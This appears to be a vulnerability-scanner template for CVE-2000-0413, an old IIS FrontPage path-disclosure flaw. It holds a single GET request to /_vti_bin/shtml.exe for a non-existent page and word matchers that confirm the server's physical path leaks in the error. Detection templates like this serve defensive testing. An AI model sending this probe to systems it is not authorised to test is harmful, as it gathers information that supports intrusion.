[info]
author = "ave"
description = "Detects IIS FrontPage shtml.exe path disclosure (CVE-2000-0413). Requesting a non-existent .htm file through shtml.exe causes IIS to return an error message revealing the physical server path on the server."
id = "POC-AVE-2000-0341"
name = "CVE-2000-0413 PoC"
severity = "medium"
tags = [
    "cve-2000-0413",
    "iis",
    "frontpage",
    "path-disclosure",
]
vuln_id = [
    "CVE-2000-0413",
    "AVE-2000-0341",
]

[poc]
logic = "any"

[[poc.requests]]
method = "GET"
path = "/_vti_bin/shtml.exe/nonexistent.htm"
protocol = "http"

[poc.requests.headers]
User-Agent = "AVE/1.0"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = [
    "0x8004",
    "physical path",
]
